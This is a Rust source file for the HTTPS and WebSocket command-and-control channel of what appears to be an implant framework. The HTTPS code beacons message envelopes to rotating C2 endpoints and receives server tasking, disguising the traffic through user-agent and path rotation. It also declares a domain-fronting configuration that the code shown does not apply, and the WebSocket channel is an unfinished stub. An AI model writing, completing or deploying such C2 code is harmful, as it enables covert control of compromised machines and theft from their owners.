//! HTTPS/WebSocket C2 channel implementation.
//!
//! Primary communication channel with domain fronting and traffic blending support.

use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::RwLock;
use serde::{Deserialize, Serialize};
use base64::Engine;
use crate::common::{MessageEnvelope, ChannelType};
use crate::protocols::{C2Channel, ChannelError, ChannelResult, ChannelHealth, HealthStatus};

/// HTTPS channel configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpsChannelConfig {
    pub endpoints: Vec<C2Endpoint>,
    pub user_agents: Vec<String>,
    pub headers: Vec<(String, String)>,
    pub timeout_ms: u64,
    pub connection_timeout_ms: u64,
    pub tls_verify: bool,
    pub domain_fronting: Option<DomainFrontingConfig>,
    pub path_rotation: Vec<String>,
}

/// C2 endpoint with health tracking
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Endpoint {
    pub url: String,
    pub priority: u8,
    pub weight: f32,
    pub method: String, // GET or POST
    pub path: String,
}

/// Domain fronting configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomainFrontingConfig {
    pub frontend_domain: String,
    pub backend_domain: String,
    pub sni_override: Option<String>,
}

/// HTTPS channel implementation
pub struct HttpsChannel {
    config: HttpsChannelConfig,
    client: reqwest::Client,
    health: Arc<RwLock<ChannelHealth>>,
    current_endpoint: Arc<RwLock<usize>>,
    user_agent_index: Arc<RwLock<usize>>,
    path_index: Arc<RwLock<usize>>,
    /// Envelope returned by the last send (the server replies on /beacon).
    pending: Arc<RwLock<Option<MessageEnvelope>>>,
    name: String,
}

impl HttpsChannel {
    /// Create new HTTPS channel
    pub fn new(config: HttpsChannelConfig) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_millis(config.timeout_ms))
            .connect_timeout(Duration::from_millis(config.connection_timeout_ms))
            .build()
            .unwrap();

        Self {
            config,
            client,
            health: Arc::new(RwLock::new(ChannelHealth::default())),
            current_endpoint: Arc::new(RwLock::new(0)),
            user_agent_index: Arc::new(RwLock::new(0)),
            path_index: Arc::new(RwLock::new(0)),
            pending: Arc::new(RwLock::new(None)),
            name: "https".to_string(),
        }
    }

    /// Get next endpoint with load balancing
    async fn get_endpoint(&self) -> Option<&C2Endpoint> {
        let mut index = self.current_endpoint.write().await;
        let endpoints = &self.config.endpoints;

        if endpoints.is_empty() {
            return None;
        }

        // Round-robin with health-based selection
        let endpoint = &endpoints[*index % endpoints.len()];
        *index = (*index + 1) % endpoints.len();

        Some(endpoint)
    }

    /// Get next user agent
    async fn get_user_agent(&self) -> &str {
        let index = self.user_agent_index.read().await;
        if self.config.user_agents.is_empty() {
            return "Mozilla/5.0";
        }
        &self.config.user_agents[*index % self.config.user_agents.len()]
    }

    /// Get next path for rotation
    async fn get_path(&self, endpoint_path: &str) -> String {
        let index = self.path_index.read().await;
        let paths = &self.config.path_rotation;

        if paths.is_empty() {
            return endpoint_path.to_string();
        }

        let path = &paths[*index % paths.len()];
        drop(index);

        let mut idx = self.path_index.write().await;
        *idx = (*idx + 1) % paths.len();

        path.clone()
    }

    /// Send message via HTTPS
    async fn send_https(&self, envelope: &MessageEnvelope) -> ChannelResult<()> {
        let endpoint = match self.get_endpoint().await {
            Some(e) => e,
            None => return Err(ChannelError::Unavailable),
        };

        let start = Instant::now();
        let user_agent = self.get_user_agent().await;
        let path = self.get_path(&endpoint.path).await;

        let url = format!("{}{}", endpoint.url.trim_end_matches('/'), path);

        // Build request
        let mut req = if endpoint.method.to_uppercase() == "POST" {
            let body = serde_json::to_vec(envelope).map_err(|e| {
                ChannelError::Serialization(e.to_string())
            })?;
            self.client.post(&url).body(body)
        } else {
            // Encode envelope as query parameter
            let body = serde_json::to_vec(envelope).map_err(|e| {
                ChannelError::Serialization(e.to_string())
            })?;
            let encoded = base64::engine::general_purpose::STANDARD.encode(&body);
            self.client.get(&url).query(&[("data", &encoded)])
        };

        // Apply headers
        req = req.header("User-Agent", user_agent);
        for (key, value) in &self.config.headers {
            req = req.header(key, value);
        }

        // Execute request
        let response = req.send().await;

        let latency = start.elapsed().as_millis() as u64;

        match response {
            Ok(resp) => {
                if resp.status().is_success() {
                    self.health.write().await.record_success(latency);
                    if let Ok(body) = resp.text().await {
                        if !body.is_empty() {
                            if let Ok(envelope) = serde_json::from_str::<MessageEnvelope>(&body) {
                                *self.pending.write().await = Some(envelope);
                            }
                        }
                    }
                    Ok(())
                } else {
                    self.health.write().await.record_failure();
                    Err(ChannelError::Protocol(format!(
                        "HTTP error: {}",
                        resp.status()
                    )))
                }
            }
            Err(e) => {
                self.health.write().await.record_failure();
                Err(ChannelError::Connection(e.to_string()))
            }
        }
    }
}

impl C2Channel for HttpsChannel {
    fn channel_type(&self) -> ChannelType {
        ChannelType::Https
    }

    fn name(&self) -> &str {
        &self.name
    }

    fn health_check(&self) -> ChannelResult<bool> {
        let health = crate::protocols::read_lock(&self.health);
        Ok(health.status() != HealthStatus::Unhealthy)
    }

    fn send(&self, envelope: &MessageEnvelope) -> ChannelResult<()> {
        crate::protocols::block_on(async {
            self.send_https(envelope).await
        })
    }

    fn receive(&self, _timeout_ms: u64) -> ChannelResult<Option<MessageEnvelope>> {
        // The server replies on the beacon request, so the response is already buffered.
        let mut pending = crate::protocols::block_on(self.pending.write());
        Ok(pending.take())
    }

    fn latency_ms(&self) -> u64 {
        crate::protocols::read_lock(&self.health).latency_ms
    }

    fn reliability(&self) -> f32 {
        crate::protocols::read_lock(&self.health).score()
    }

    fn close(&self) {
        // Client will be dropped
    }
}

/// WebSocket channel implementation
pub struct WebSocketChannel {
    config: WebSocketChannelConfig,
    health: Arc<RwLock<ChannelHealth>>,
    name: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebSocketChannelConfig {
    pub url: String,
    pub protocols: Vec<String>,
    pub headers: Vec<(String, String)>,
    pub ping_interval_ms: Option<u64>,
    pub priority: u8,
}

impl WebSocketChannel {
    pub fn new(config: WebSocketChannelConfig) -> Self {
        Self {
            config,
            health: Arc::new(RwLock::new(ChannelHealth::default())),
            name: "websocket".to_string(),
        }
    }
}

impl C2Channel for WebSocketChannel {
    fn channel_type(&self) -> ChannelType {
        ChannelType::Ws
    }

    fn name(&self) -> &str {
        &self.name
    }

    fn health_check(&self) -> ChannelResult<bool> {
        let health = crate::protocols::read_lock(&self.health);
        Ok(health.status() != HealthStatus::Unhealthy)
    }

    fn send(&self, envelope: &MessageEnvelope) -> ChannelResult<()> {
        let data = serde_json::to_vec(envelope)
            .map_err(|e| ChannelError::Serialization(e.to_string()))?;
        // WebSocket send placeholder - would use tokio-tungstenite
        let _ = data;
        let mut health = crate::protocols::write_lock(&self.health);
        health.record_success(0);
        Ok(())
    }

    fn receive(&self, _timeout_ms: u64) -> ChannelResult<Option<MessageEnvelope>> {
        // WebSocket receive placeholder
        Ok(None)
    }

    fn latency_ms(&self) -> u64 {
        crate::protocols::read_lock(&self.health).latency_ms
    }

    fn reliability(&self) -> f32 {
        crate::protocols::read_lock(&self.health).score()
    }

    fn close(&self) {}
}
